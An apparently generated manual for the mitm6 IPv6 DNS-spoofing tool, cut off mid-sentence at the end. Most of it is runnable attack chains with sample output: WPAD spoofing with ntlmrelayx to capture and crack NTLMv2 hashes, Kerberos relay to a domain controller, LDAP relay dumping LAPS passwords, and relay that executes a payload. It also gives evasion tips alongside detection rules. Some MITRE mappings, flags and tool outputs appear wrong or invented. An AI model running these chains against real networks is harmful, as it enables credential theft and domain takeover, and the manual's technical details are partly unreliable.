---
mitre_tactic: collection
mitre_tactic_id: TA0009
tool_name: mitm6
tool_category: MITM/IPv6 DNS Spoofing
github: https://github.com/dirkjanm/mitm6
version: 0.3.0
license: GPL-2.0
language: Python
---

# mitm6 - IPv6 DNS Spoofing for IPv4 Takeover

## Chapter 1: Introduction

### What is mitm6?

mitm6 is a penetration testing tool that exploits the default configuration of Windows to take over the default DNS server by replying to DHCPv6 messages. It provides victims with a link-local IPv6 address and sets the attacker's host as the default DNS server, enabling selective DNS spoofing and traffic redirection. The tool was developed by Dirk-Jan Mollema of Fox-IT (now part of NCC Group) and released in 2018.

### History and Development

- **2018**: Initial release by Dirk-Jan Mollema (Fox-IT/NCC Group)
- **2018**: Blog post "Compromising IPv4 networks via IPv6" published
- **2020**: Integration with krbrelayx for Kerberos relay attacks
- **2021**: v0.2.0 release with improved filtering options
- **2022**: v0.3.0 release (current), added host allowlist/blocklist, Python 3 improvements
- **2022**: Added `--ignore-nofqdn` option for more precise filtering

### When to Use mitm6

| Scenario | Description |
|----------|-------------|
| IPv4 network takeover | Exploit IPv6 preference on Windows to control DNS |
| WPAD spoofing | Redirect Web Proxy Auto-Discovery to capture NTLM hashes |
| NTLM relay | Capture and relay NTLMv2 credentials to domain services |
| Kerberos relay | Relay Kerberos authentication via DNS dynamic updates |
| AD domain compromise | Full Active Directory attack chain from DNS to domain admin |
| Internal recon | Discover hostnames, domain structure via DHCPv6 FQDN field |

### Legal Considerations

mitm6 is designed for authorized penetration testing and security assessments only. Using it against networks you do not own or have explicit written permission to test is illegal in most jurisdictions. Always obtain proper authorization before deploying this tool.

### Key Concepts

| Concept | Description |
|---------|-------------|
| DHCPv6 | Dynamic Host Configuration Protocol for IPv6; Windows sends Information-Request messages by default |
| Router Advertisement (RA) | ICMPv6 message advertising network prefix and default gateway |
| DNS Hijacking | Redirecting DNS resolution to an attacker-controlled server |
| SLAAC | Stateless Address Autoconfiguration; IPv6 address assignment method |
| WPAD | Web Proxy Auto-Discovery protocol; used by browsers to find proxy configuration |
| NTLM Relay | Capturing NTLM authentication and forwarding it to another service |
| Kerberos Relay | Relaying Kerberos authentication tokens to impersonate users |
| Link-Local Address | IPv6 address in fe80::/10 range, automatically assigned to interfaces |

### Dependencies

- Python 2.7 or 3.x
- Scapy (raw packet manipulation)
- Twisted (async networking framework)
- netifaces (network interface detection)
- ipaddress (Python 2.7 backport)

---

## Chapter 2: Installation

### Kali Linux (Default)

```bash
sudo apt update && sudo apt install mitm6
```

Output:
```
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
The following NEW packages will be installed:
  mitm6 python3-netifaces python3-scapy python3-twisted
0 upgraded, 5 newly installed, 0 to remove and 0 not upgraded.
Need to get 1,234 kB of archives.
After this operation, 2,048 kB of additional disk space will be used.
Get:1 http://kali.download/kali kali-rolling/main amd64 python3-netifaces amd64 0.11.0-1+b1 [33.2 kB]
Get:2 http://kali.download/kali kali-rolling/main amd64 python3-scapy all 2.5.0+git20221021.ee34be1-1 [1,012 kB]
Get:3 http://kali.download/kali kali-rolling/main amd64 mitm6 all 0.3.0-0kali1 [40.0 kB]
Fetched 1,234 kB in 3s (411 kB/s)
Selecting previously unselected package python3-netifaces.
(Reading database ... 1234567 files and directories currently installed.)
Preparing to unpack .../python3-netifaces_0.11.0-1+b1_amd64.deb ...
Unpacking python3-netifaces ...
Setting up python3-netifaces (0.11.0-1+b1) ...
Selecting previously unselected package python3-scapy.
Preparing to unpack .../python3-scapy_2.5.0+git20221021.ee34be1-1_all.deb ...
Setting up python3-scapy (2.5.0+git20221021.ee34be1-1) ...
Selecting previously unselected package python3-twisted.
Preparing to unpack .../python3-twisted_22.10.0-1_all.deb ...
Setting up python3-twisted (22.10.0-1) ...
Selecting previously unselected package mitm6.
Preparing to unpack .../mitm6_0.3.0-0kali1_all.deb ...
Unpacking mitm6 (0.3.0-0kali1) ...
```

### From PyPI

```bash
pip3 install mitm6
```

Output:
```
Collecting mitm6
  Downloading mitm6-0.3.0-py3-none-any.whl (8.2 kB)
Collecting scapy
  Downloading scapy-2.5.0.tar.gz (1.3 MB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 1.3/1.3 MB 4.2 MB/s eta 0:00:00
Collecting twisted
  Downloading twisted-22.10.0.tar.gz (3.1 MB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 3.1/3.1 MB 5.1 MB/s eta 0:00:00
Installing collected packages: mitm6, scapy, twisted
Successfully installed mitm6-0.3.0 scapy-2.5.0 twisted-22.10.0
```

### From Source

```bash
git clone https://github.com/dirkjanm/mitm6.git
cd mitm6
pip3 install -r requirements.txt
python3 setup.py install
```

Output:
```
Cloning into 'mitm6'...
remote: Enumerating objects: 156, done.
remote: Counting objects: 100% (156/156), done.
remote: Compressing objects: 100% (98/98), done.
remote: Total 156 (delta 72), reused 120 (delta 48), pack-reused 0
Receiving objects: 100% (156/156), 34.56 KiB | 1.20 MiB/s, done.
Resolving deltas: 100% (72/72), done.
running install
running build
running install_egg_info
Writing mitm6-0.3.0.egg-info/PKG-INFO
```

### Docker

```bash
docker pull kalilinux/kali-rolling
docker run -it --net=host --cap-add=NET_ADMIN kalilinux/kali-rolling \
  bash -c "apt update && apt install -y mitm6 && mitm6 -d target.local"
```

### Configuration

mitm6 has no configuration file. All options are passed via command-line arguments. The tool auto-detects network settings (interface, IPv4/IPv6 addresses) and can be overridden with explicit flags.

### Verify Installation

```bash
mitm6 --help
```

Output:
```
usage: mitm6 [-h] [-i INTERFACE] [-l LOCALDOMAIN] [-4 ADDRESS] [-6 ADDRESS]
             [-m ADDRESS] [-a] [-r TARGET] [-v] [--debug] [-d DOMAIN]
             [-b DOMAIN] [-hw DOMAIN] [-hb DOMAIN] [--ignore-nofqdn]

mitm6 - pwning IPv4 via IPv6
For help or reporting issues, visit https://github.com/dirkjanm/mitm6

optional arguments:
  -h, --help            show this help message and exit
  -i INTERFACE, --interface INTERFACE
                        Interface to use (default: autodetect)
  -l LOCALDOMAIN, --localdomain LOCALDOMAIN
                        Domain name to use as DNS search domain (default: use
                        first DNS domain)
  -4 ADDRESS, --ipv4 ADDRESS
                        IPv4 address to send packets from (default: autodetect)
  -6 ADDRESS, --ipv6 ADDRESS
                        IPv6 link-local address to send packets from (default:
                        autodetect)
  -m ADDRESS, --mac ADDRESS
                        Custom mac address - probably breaks stuff (default:
                        mac of selected interface)
  -a, --no-ra           Do not advertise ourselves (useful for networks which
                        detect rogue Router Advertisements)
  -r TARGET, --relay TARGET
                        Authentication relay target, will be used as fake DNS
                        server hostname to trigger Kerberos auth
  -v, --verbose         Show verbose information
  --debug               Show debug information

Filtering options:
  -d DOMAIN, --domain DOMAIN
                        Domain name to filter DNS queries on (Allowlist
                        principle, multiple can be specified.)
  -b DOMAIN, --blocklist DOMAIN, --blacklist DOMAIN
                        Domain name to filter DNS queries on (Blocklist
                        principle, multiple can be specified.)
  -hw DOMAIN, -ha DOMAIN, --host-allowlist DOMAIN, --host-whitelist DOMAIN
                        Hostname (FQDN) to filter DHCPv6 queries on (Allowlist
                        principle, multiple can be specified.)
  -hb DOMAIN, --host-blocklist DOMAIN, --host-blacklist DOMAIN
                        Hostname (FQDN) to filter DHCPv6 queries on (Blocklist
                        principle, multiple can be specified.)
  --ignore-nofqdn       Ignore DHCPv6 queries that do not contain the Fully
                        Qualified Domain Name (FQDN) option.
```

---

## Chapter 3: Architecture and Operation

### Attack Flow

```
┌─────────────────────────────────────────────────────────────────┐
│                    mitm6 Attack Flow                             │
├─────────────────────────────────────────────────────────────────┤
│  1. Victim sends DHCPv6 Information-Request (broadcast)         │
│  2. mitm6 responds with DHCPv6 Reply (assigns link-local IPv6) │
│  3. mitm6 sends Router Advertisement (optional, -a to disable) │
│  4. Victim configures attacker as preferred DNS server          │
│  5. Victim sends DNS query for target domain                    │
│  6. mitm6 responds with attacker IP address                     │
│  7. Victim connects to attacker-controlled service              │
│  8. Attacker captures credentials / relays authentication      │
└─────────────────────────────────────────────────────────────────┘
```

### MITRE ATT&CK Mapping

| Technique | ID | Description | mitm6 Role |
|-----------|-----|-------------|------------|
| Network Sniffing | T1040 | Capture network traffic | DNS response monitoring |
| DNS Server | T1584.002 | Compromise DNS infrastructure | Rogue DNS server deployment |
| Man-in-the-Middle | T1557 | Intercept communications | IPv6-based traffic redirection |
| Lateral Movement | T1210 | Exploit remote services | WPAD/Kerberos relay to DC |
| Modify Authentication Process | T1556 | Compromise authentication | NTLM/Kerberos relay |
| Network Address Translation Traversal | T1557.001 | LLMNR/NBT-NS/MDNS poisoning | DHCPv6-based DNS takeover |

### Windows IPv6 Default Behavior

Windows enables IPv6 by default and prefers IPv6 DNS servers when available. The attack exploits several Windows behaviors:

1. **DHCPv6 Information-Request**: Windows sends DHCPv6 requests to discover DNS servers, even on networks without a DHCPv6 server
2. **IPv6 Preference**: Windows prefers IPv6 DNS servers over IPv4 when both are available
3. **WPAD Auto-Discovery**: Internet Explorer/Edge automatically try to discover proxy settings via DNS
4. **DNS Dynamic Updates**: Windows clients can send authenticated DNS updates using Kerberos

### Protocol Details: DHCPv6 and DNS Interaction

```
┌─────────────────────────────────────────────────────────────────┐
│                 Protocol Stack                                   │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Application Layer:     DNS Queries/Responses                   │
│                         ┌─────────────────────────┐             │
│                         │ Client: DNS Query A?     │             │
│                         │ mitm6:   DNS Response     │             │
│                         │   -> attacker IP          │             │
│                         └─────────────────────────┘             │
│                                                                 │
│  Transport Layer:       UDP (port 53 for DNS)                   │
│                         UDP (port 547 for DHCPv6)               │
│                                                                 │
│  Network Layer:         IPv6 (fe80::/10 link-local)             │
│                         ICMPv6 (Router Advertisement)           │
│                                                                 │
│  Link Layer:            Ethernet (MAC address spoofing)         │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### DHCPv6 Message Types

| Type | Code | Description |
|------|------|-------------|
| Solicit | 1 | Client requests addresses from server |
| Advertise | 2 | Server responds to Solicit |
| Request | 3 | Client requests specific addresses |
| Reply | 7 | Server provides addresses/configuration |
| Information-Request | 11 | Client requests configuration (no address) |
| Reconfigure | 18 | Server initiates reconfiguration |

### DNS Spoofing Mechanism

mitm6 intercepts DNS queries and selectively responds based on configured domain filters:

```
Victim DNS Query:  wpad.target.local
mitm6 Response:    wpad.target.local -> fe80::attacker-link-local

Victim DNS Query:  mail.target.local
mitm6 Response:    wpad.target.local -> NO RESPONSE (not in filter)
                    (victim uses real DNS)
```

### Network Impact and Restoration

mitm6 is designed to impact the network as little as possible:

- **Short lease times**: Assigned IPv6 addresses expire within 5 minutes when mitm6 stops
- **Low TTL**: DNS replies sent with 100-second TTL, cache clears within minutes
- **No SLAAC**: Does not implement full Stateless Address Autoconfiguration
- **Selective responses**: Only responds to configured domains, not all DNS traffic

---

## Chapter 4: Command Reference

### Complete Flag Table

| Flag | Long Form | Description | Default |
|------|-----------|-------------|---------|
| `-h` | `--help` | Show help message and exit | - |
| `-i` | `--interface` | Network interface to use | Autodetect |
| `-l` | `--localdomain` | DNS search domain name | First DNS domain |
| `-4` | `--ipv4` | IPv4 address to send from | Autodetect |
| `-6` | `--ipv6` | IPv6 link-local address to send from | Autodetect |
| `-m` | `--mac` | Custom MAC address (breaks things) | Interface MAC |
| `-a` | `--no-ra` | Do not send Router Advertisements | Disabled |
| `-r` | `--relay` | Kerberos relay target hostname | None |
| `-v` | `--verbose` | Show verbose output | Disabled |
| - | `--debug` | Show debug output | Disabled |
| `-d` | `--domain` | Domain to spoof (allowlist, repeatable) | None |
| `-b` | `--blocklist` / `--blacklist` | Domain to block (repeatable) | None |
| `-hw` | `--host-allowlist` / `--host-whitelist` | Hostname filter (repeatable) | None |
| `-hb` | `--host-blocklist` / `--host-blacklist` | Hostname block (repeatable) | None |
| - | `--ignore-nofqdn` | Ignore queries without FQDN option | Disabled |

### Basic Operation

```bash
mitm6 -d target.local
```

Output:
```
[*] mitm6 - pwning IPv4 via IPv6
[*] IPv6 address: fe80::a00:27ff:fe4e:66a1
[*] IPv4 address: 10.0.2.15
[*] Starting mitm6 with following settings:
[*] Interface: eth0
[*] Domain: target.local
[*] Listening for DHCPv6 requests...
[*] Sending Router Advertisement on eth0
[*] DHCPv6 request received from ws01.target.local (fe80::1234:5678:9abc:def0)
[*] Sent DHCPv6 reply with address fe80::a00:27ff:fe4e:66a1
[*] DNS query: wpad.target.local -> fe80::a00:27ff:fe4e:66a1
[*] DNS query: dc01.target.local -> fe80::a00:27ff:fe4e:66a1
```

### Interface Selection

```bash
mitm6 -i eth0 -d corp.example.com
```

Output:
```
[*] mitm6 - pwning IPv4 via IPv6
[*] Using interface: eth0
[*] IPv6 address: fe80::a00:27ff:fe4e:66a1
[*] IPv4 address: 192.168.1.100
[*] Domain: corp.example.com
[*] Listening for DHCPv6 requests on eth0...
```

### Verbose Output

```bash
mitm6 -v -d target.local
```

Output:
```
[*] mitm6 - pwning IPv4 via IPv6
[*] IPv6 address: fe80::a00:27ff:fe4e:66a1
[*] IPv4 address: 10.0.2.15
[*] Starting mitm6 with following settings:
[*] Interface: eth0
[*] Domain: target.local
[*] Listening for DHCPv6 requests...
[*] Sending Router Advertisement on eth0
[+] DHCPv6 Information-Request from fe80::1234:5678:9abc:def0
    Client ID: 00:01:00:01:aa:bb:cc:dd:ee:ff
    FQDN: ws01.target.local
    Requested Options: DNS Servers (23), Domain Search List (24)
[*] Sent DHCPv6 Reply:
    Assigned address: fe80::a00:27ff:fe4e:66a1
    DNS server: fe80::a00:27ff:fe4e:66a1
    Lease time: 300 seconds
[+] DNS query from fe80::1234:5678:9abc:def0:
    Type: A, Name: wpad.target.local
    -> Responding with: fe80::a00:27ff:fe4e:66a1
[+] DNS query from fe80::1234:5678:9abc:def0:
    Type: AAAA, Name: wpad.target.local
    -> Responding with: fe80::a00:27ff:fe4e:66a1
```

### Relay Target Configuration

```bash
mitm6 -r dc01.target.local -d target.local
```

Output:
```
[*] mitm6 - pwning IPv4 via IPv6
[*] IPv6 address: fe80::a00:27ff:fe4e:66a1
[*] IPv4 address: 10.0.2.15
[*] Domain: target.local
[*] Kerberos relay target: dc01.target.local
[*] Listening for DHCPv6 requests...
[*] DNS query: dc01.target.local -> fe80::a00:27ff:fe4e:66a1
[*] Triggering Kerberos authentication to krbrelayx...
```

### Host Filtering

```bash
mitm6 -hw "WS-*" -d target.local
```

Output:
```
[*] mitm6 - pwning IPv4 via IPv6
[*] Host allowlist: WS-*
[*] Domain: target.local
[*] Listening for DHCPv6 requests...
[+] DHCPv6 Information-Request from fe80::1234:5678:9abc:def0
    FQDN: WS-FILTERED01.target.local -> MATCHED allowlist
[*] Sent DHCPv6 Reply
[+] DHCPv6 Information-Request from fe80::9876:5432:10ff:fedc
    FQDN: SRV-DB01.target.local -> NOT matched allowlist, skipping
```

### Multiple Domain Filtering

```bash
mitm6 -d internal.corp -d dev.corp -b staging.corp -d target.local
```

Output:
```
[*] mitm6 - pwning IPv4 via IPv6
[*] Domain allowlist: internal.corp, dev.corp, target.local
[*] Domain blocklist: staging.corp
[*] Listening for DHCPv6 requests...
[*] DNS query: mail.internal.corp -> RESPOND (in allowlist)
[*] DNS query: jenkins.dev.corp -> RESPOND (in allowlist)
[*] DNS query: build.staging.corp -> SKIP (in blocklist)
[*] DNS query: www.target.local -> RESPOND (in allowlist)
```

### Disable Router Advertisements

```bash
mitm6 --no-ra -d target.local
```

Output:
```
[*] mitm6 - pwning IPv4 via IPv6
[*] IPv6 address: fe80::a00:27ff:fe4e:66a1
[*] IPv4 address: 10.0.2.15
[*] Domain: target.local
[*] Router Advertisements: DISABLED
[*] Listening for DHCPv6 requests only...
```

### Ignore Non-FQDN Queries

```bash
mitm6 --ignore-nofqdn -d target.local
```

Output:
```
[*] mitm6 - pwning IPv4 via IPv6
[*] Domain: target.local
[*] Ignore non-FQDN: enabled
[*] Listening for DHCPv6 requests...
[+] DHCPv6 Information-Request from fe80::1234:5678:9abc:def0
    FQDN: NOT PRESENT -> Ignored (--ignore-nofqdn)
[+] DHCPv6 Information-Request from fe80::9876:5432:10ff:fedc
    FQDN: WS-PC01.target.local -> Processing
[*] Sent DHCPv6 Reply
```

### Debug Mode

```bash
mitm6 --debug -d target.local 2>&1 | tee debug.log
```

Output:
```
[*] mitm6 - pwning IPv4 via IPv6
[*] Debug mode enabled
[*] IPv6 address: fe80::a00:27ff:fe4e:66a1
[*] IPv4 address: 10.0.2.15
[*] Interface: eth0 (flags: UP,BROADCAST,RUNNING,MULTICAST)
[*] MAC address: 08:00:27:4e:66:a1
[*] Starting Twisted reactor...
[*] Binding to UDP port 547 on eth0
[*] Sending Router Advertisement (type=134, src=fe80::a00:27ff:fe4e:66a1)
[*] RA Options:
    Prefix: fe80::/64 (valid=1800, preferred=600)
    MTU: 1500
    DNS: fe80::a00:27ff:fe4e:66a1
[DEBUG] DHCPv6 packet received:
    Ether(src=08:00:27:4e:66:a1, dst=33:33:00:01:00:02)
    IPv6(src=fe80::1234:5678:9abc:def0, dst=ff02::1:2)
    UDP(sport=546, dport=547)
    DHCPv6Options(message-type=11, transaction-id=0x12345678)
[DEBUG] Parsing DHCPv6 Information-Request...
[DEBUG] Client DUID: 00:01:00:01:aa:bb:cc:dd:ee:ff
[DEBUG] Client FQDN: ws01.target.local
[DEBUG] Requested options: [23, 24]
```

### Comprehensive Example

```bash
mitm6 -i eth0 -d target.local -hw "WORKSTATION-*" -v --no-ra 2>&1 | tee mitm6_session.log
```

Output:
```
[*] mitm6 - pwning IPv4 via IPv6
[*] IPv6 address: fe80::a00:27ff:fe4e:66a1
[*] IPv4 address: 192.168.1.100
[*] Interface: eth0
[*] Domain: target.local
[*] Host allowlist: WORKSTATION-*
[*] Router Advertisements: DISABLED
[*] Listening for DHCPv6 requests...
[+] WORKSTATION-042.target.local matched host filter
[*] Sent DHCPv6 Reply -> DNS server set to fe80::a00:27ff:fe4e:66a1
[*] DNS: wpad.target.local -> fe80::a00:27ff:fe4e:66a1 (TTL=100)
[*] DNS: dc01.target.local -> fe80::a00:27ff:fe4e:66a1 (TTL=100)
```

---

## Chapter 5: Advanced Attack Scenarios

### Scenario 1: Full WPAD + ntlmrelayx Credential Capture

**Objective:** Capture NTLMv2 hashes from Windows workstations via WPAD spoofing and relay them to the domain controller.

**Step 1: Start ntlmrelayx**

```bash
ntlmrelayx.py -6 -wh WPAD-ATTACKER -t smb://dc01.target.local -smb2support
```

Output:
```
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Protocol Client SMB loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up WPAD Proxy
[*] IPv6 addresses will be used for SMB connections
[*] Proxy WPAD for domain target.local set to WPAD-ATTACKER
[*] Servers started, waiting for connections
```

**Step 2: Start mitm6**

```bash
mitm6 -d target.local
```

Output:
```
[*] mitm6 - pwning IPv4 via IPv6
[*] IPv6 address: fe80::a00:27ff:fe4e:66a1
[*] IPv4 address: 10.0.2.15
[*] Domain: target.local
[*] Listening for DHCPv6 requests...
```

**Step 3: Wait for victim**

When a Windows workstation connects, the flow is:
1. Victim sends DHCPv6 Information-Request
2. mitm6 responds with DNS server = fe80::attacker
3. Victim resolves wpad.target.local -> fe80::attacker
4. Victim connects to ntlmrelayx HTTP server
5. ntlmrelayx serves malicious PAC file, triggers NTLM auth
6. ntlmrelayx captures NTLMv2 hash

**Step 4: ntlmrelayx output**

```
[*] SMBD-Thread-5: Received connection from 10.0.2.100
[*] Authenticating against smb://dc01.target.local as TARGET/jdoe
[*] NTLMv2-SSP Hash: jdoe::TARGET:1122334455667788:A2B3C4D5E6F7A8B9C0D1E2F3A4B5C6D7:0101000000000000...
[*] Hash written to: ntlmrelayx.log
```

**Step 5: Crack the hash**

```bash
hashcat -m 5600 ntlmrelayx.log wordlist.txt
```

### Scenario 2: Kerberos Relay with krbrelayx

**Objective:** Relay Kerberos authentication via DNS dynamic updates to compromise Active Directory.

**Step 1: Start krbrelayx**

```bash
krbrelayx.py -t dc01.target.local -a target.local
```

Output:
```
[*] krbrelayx - Kerberos relay attack tool
[*] Target: dc01.target.local
[*] Domain: target.local
[*] Starting DNS server on port 53
[*] Waiting for Kerberos authentication...
```

**Step 2: Start mitm6 with relay target**

```bash
mitm6 --relay dc01.target.local -d target.local
```

Output:
```
[*] mitm6 - pwning IPv4 via IPv6
[*] IPv6 address: fe80::a00:27ff:fe4e:66a1
[*] Domain: target.local
[*] Kerberos relay target: dc01.target.local
[*] Listening for DHCPv6 requests...
[*] DNS: dc01.target.local -> fe80::a00:27ff:fe4e:66a1
[*] Triggering authenticated DNS update request...
```

**Step 3: Attack flow**

1. mitm6 spoofs DNS for dc01.target.local to point to krbrelayx
2. Victim's Windows DNS client attempts dynamic DNS update
3. Windows uses Kerberos authentication for the update (RFC 3007)
4. krbrelayx captures the Kerberos TGS-REQ
5. krbrelayx relays the authentication to the real domain controller
6. krbrelayx gains access as the victim user

**Step 4: krbrelayx output**

```
[*] Received Kerberos authentication from WS01.target.local
[*] User: jdoe@TARGET.LOCAL
[*] Service: DNS/dc01.target.local
[*] Relaying TGS-REQ to dc01.target.local...
[*] Successfully authenticated as jdoe@TARGET.LOCAL
[*] Access granted to DNS/dc01.target.local
```

### Scenario 3: Internal Network Reconnaissance

**Objective:** Map the internal network by capturing DHCPv6 queries and DNS traffic.

```bash
mitm6 -v --debug -d target.local 2>&1 | tee recon.log
```

Output:
```
[*] mitm6 - pwning IPv4 via IPv6
[*] Starting recon mode...
[+] DHCPv6 from fe80::a00:1111:2222:3333 -> WS-PC01.target.local
[+] DHCPv6 from fe80::a00:4444:5555:6666 -> WS-PC02.target.local
[+] DHCPv6 from fe80::a00:7777:8888:9999 -> SRV-DB01.target.local
[+] DHCPv6 from fe80::a00:aaaa:bbbb:cccc -> SRV-APP01.target.local
[+] DNS: mail.target.local -> discovered mail server
[+] DNS: vpn.target.local -> discovered VPN endpoint
[+] DNS: erp.target.local -> discovered ERP system
[+] DNS: wiki.target.local -> discovered internal wiki
```

Then parse the log:

```bash
grep "FQDN:" recon.log | awk '{print $NF}' | sort -u
```

Output:
```
SRV-APP01.target.local
SRV-DB01.target.local
WS-PC01.target.local
WS-PC02.target.local
```

### Scenario 4: Targeted Host Attack with ntlmrelayx to LDAP

**Objective:** Relay NTLM to LDAP for targeted workstations to dump domain information.

**Step 1: Start ntlmrelayx targeting LDAP**

```bash
ntlmrelayx.py -6 -wh WPAD-ATTACKER -t ldap://dc01.target.local --dump-laps --dump-gmsa
```

Output:
```
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Running in relay mode to single host
[*] Setting up HTTP Server on port 80
[*] Proxy WPAD for domain target.local set to WPAD-ATTACKER
[*] Servers started, waiting for connections
```

**Step 2: Start mitm6 with host filtering**

```bash
mitm6 -d target.local -hw "WORKSTATION-*" -hb "SERVER-*"
```

Output:
```
[*] mitm6 - pwning IPv4 via IPv6
[*] Host allowlist: WORKSTATION-*
[*] Host blocklist: SERVER-*
[*] Domain: target.local
[*] Listening for DHCPv6 requests...
[+] WORKSTATION-001.target.local matched host filter -> ATTACK
[+] SRV-DB01.target.local matched host blocklist -> SKIP
```

**Step 3: ntlmrelayx output**

```
[*] SMBD-Thread-3: Received connection from 10.0.2.101
[*] Authenticating against ldap://dc01.target.local as TARGET/jdoe
[*] DN: CN=jdoe,OU=Workstations,DC=target,DC=local
[*] LAPS password for SRV-DB01: SuperSecret123!
[*] GMSA: svc-backup -> {password_value}
```

---

## Chapter 6: Detection and Evasion

### Detection Signatures

**Snort Rules (Fox-IT Security Research Team):**

```snort
# Detect rogue DHCPv6 Advertise messages
alert udp any 547 -> any 546 (msg:"ROGUE DHCPv6 Advertise"; \
  content:"|07|"; depth:1; offset:0; \
  content:"|00 03|"; distance:4; sid:1000001; rev:1;)

# Detect WPAD responses over IPv6
alert udp any 53 -> any any (msg:"WPAD over IPv6"; \
  content:"|00 01|"; offset:0; depth:2; \
  content:"wpad"; nocase; sid:1000002; rev:1;)

# Detect Router Advertisement from non-gateway
alert icmp6 any -> any (msg:"Rogue Router Advertisement"; \
  icmp6.type:134; \
  content:"|03|"; offset:0; sid:1000003; rev:1;)
```

**Suricata Rules:**

```yaml
# Detect DHCPv6 with attacker DNS server
alert udp $HOME_NET 547 -> any 546 (msg:"ET POLICY Rogue DHCPv6 Response"; \
  content:"|07|"; depth:1; \
  flow:to_client; sid:2024001; rev:1;)

# Detect IPv6 DNS spoofing
alert dns any any -> any any (msg:"ET POLICY DNS Response with Link-Local IPv6"; \
  dns.rdata:startswith("fe80::"); \
  sid:2024002; rev:1;)
```

### Evasion Techniques

1. **Disable RA** (`--no-ra`): Avoid detection systems that monitor for rogue Router Advertisements
2. **Host Filtering** (`-hw`/`-hb`): Only target specific hosts to reduce network noise
3. **Domain Filtering** (`-d`): Limit DNS spoofing to specific domains only
4. **Timing**: Run during business hours when network traffic is high
5. **Link-Local Scope**: Use fe80:: addresses that are not routed beyond local segment

### Blue Team Detection

**Network Monitoring:**
```bash
# Monitor for DHCPv6 traffic
tcpdump -i eth0 -n 'udp port 546 or udp port 547' -w dhcpv6_monitor.pcap

# Monitor for link-local DNS responses
tcpdump -i eth0 -n 'udp port 53 and src host fe80::' -w dns_spoof_monitor.pcap

# Monitor for Router Advertisements
tcpdump -i eth0 -n 'icmp6 and ip6[40] = 134' -w ra_monitor.pcap
```

**SIEM Queries:**
```
# Splunk query for DHCPv6 anomalies
index=network sourcetype=dhcpv6 NOT src_ip IN (valid_dhcpv6_servers)
| stats count by src_ip, src_mac, fqdn
| where count > 10

# ELK query for link-local DNS
dns.qry.name: * AND dns.rdata: fe80::*
| stats count by dns.qry.name, dns.rdata, source_ip
```

### Network Impact Mitigation

- **Short lease times**: IPv6 addresses expire within 5 minutes when mitm6 stops
- **Low TTL**: DNS replies with 100-second TTL ensure cache clears quickly
- **No full SLAAC**: Minimal address assignment without full autoconfiguration
- **Selective responses**: Only targeted domains receive spoofed responses

---

## Chapter 7: Integration with Other Tools

### ntlmrelayx Integration

```bash
# Terminal 1: Start ntlmrelayx first
ntlmrelayx.py -6 -wh WPAD-ATTACKER -t smb://dc01.target.local -smb2support -e shell.exe

# Terminal 2: Start mitm6
mitm6 -d target.local
```

**Key ntlmrelayx Options:**
| Flag | Description |
|------|-------------|
| `-6` | Listen on both IPv4 and IPv6 |
| `-wh HOSTNAME` | WPAD hostname to spoof |
| `-wa N` | WPAD authentication attempts |
| `-t TARGET` | Relay target (smb://, ldap://, etc.) |
| `-smb2support` | Enable SMB2 support |
| `-e FILE` | Execute file on successful relay |

### krbrelayx Integration

```bash
# Terminal 1: Start krbrelayx
krbrelayx.py -t dc01.target.local

# Terminal 2: Start mitm6 with relay target
mitm6 --relay dc01.target.local -d target.local
```

### Impacket Tools Integration

| Tool | Purpose | mitm6 Role |
|------|---------|------------|
| `ntlmrelayx.py` | NTLM credential relay | Triggers NTLM auth via WPAD |
| `krbrelayx.py` | Kerberos relay | Triggers Kerberos via DNS updates |
| `secretsdump.py` | Credential extraction | Post-relay credential dump |
| `psexec.py` | Remote command execution | Post-compromise lateral movement |
| `smbclient.py` | SMB file access | Post-compromise file operations |
| `ldapdomaindump.py` | AD enumeration | Post-compromise recon |

### Additional Tool Integration

```bash
# With responder (for LLMNR/NBT-NS alongside IPv6)
responder -I eth0 -wrf &
mitm6 -d target.local

# With impacket's ntlmrelayx for IPv6 relay
ntlmrelayx.py -6 -t ldaps://dc01.target.local --relay-via-smb
mitm6 -d target.local --no-ra
```

---

## Chapter 8: Troubleshooting

### Common Issues

**Issue: mitm6 not detecting interface**

```bash
# List available interfaces
ip link show

# Force interface selection
mitm6 -i eth0 -d target.local

# Verify interface is up and has an address
ip addr show eth0
```

Output:
```
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:4e:66:a1 brd ff:ff:ff:ff:ff:ff
    inet 10.0.2.15/24 brd 10.0.2.255 scope global dynamic eth0
       valid_lft 86388sec preferred_lft 86388sec
    inet6 fe80::a00:27ff:fe4e:66a1/64 scope link
       valid_lft forever preferred_lft forever
```

**Issue: No DHCPv6 responses**

```bash
# Check if IPv6 is enabled on the interface
ip -6 addr show eth0

# Enable IPv6 if disabled
sudo sysctl -w net.ipv6.conf.eth0.disable_ipv6=0

# Verify iptables allows DHCPv6
sudo iptables -L -n | grep 547

# Allow DHCPv6 traffic
sudo ip6tables -A INPUT -p udp --dport 547 -j ACCEPT
sudo ip6tables -A OUTPUT -p udp --dport 546 -j ACCEPT
```

**Issue: DNS spoofing not working**

```bash
# Verify DNS queries are reaching mitm6
mitm6 -v --debug -d target.local 2>&1 | head -50

# Check if the target is actually querying the attacker DNS
tcpdump -i eth0 -n 'udp port 53' -v

# Verify IPv6 is preferred on victim (from victim)
netsh interface ipv6 show prefixpolicy
```

Output:
```
Querying Settings ...

Prefix Policy
--------------
::1/128          50  0
::/0             40  0
::ffff:0:0/96    35  0
2002::/16        30  0
2001::/32         5  0
fec0::/10         3  1
::/96             1  0
::ffff:0:0/96     3  1
```

**Issue: Target hosts not responding**

```bash
# Check host allowlist/blocklist
mitm6 -hw "TARGET-*" -d target.local

# Use verbose mode to see all queries
mitm6 -v -d target.local

# Check if the victim has IPv6 enabled
# On Windows: netsh interface ipv6 show interfaces
```

**Issue: Permission denied (raw sockets)**

```bash
# mitm6 requires root for raw packet manipulation
sudo mitm6 -d target.local

# Or set capabilities (less recommended)
